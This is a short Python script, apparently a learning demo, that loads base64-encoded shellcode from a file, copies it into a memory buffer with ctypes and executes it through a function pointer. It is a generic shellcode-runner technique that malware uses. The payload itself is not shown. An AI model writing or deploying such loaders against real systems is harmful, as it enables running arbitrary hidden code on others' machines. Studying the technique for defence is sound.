import ctypes
import base64

# decode the shellcode from base64 
file = open("shellcodes/meowBox64", "r") 
shell_b64 = file.read() 

shellcode = base64.b64decode(shell_b64)

# create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode
shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
shellcode_func()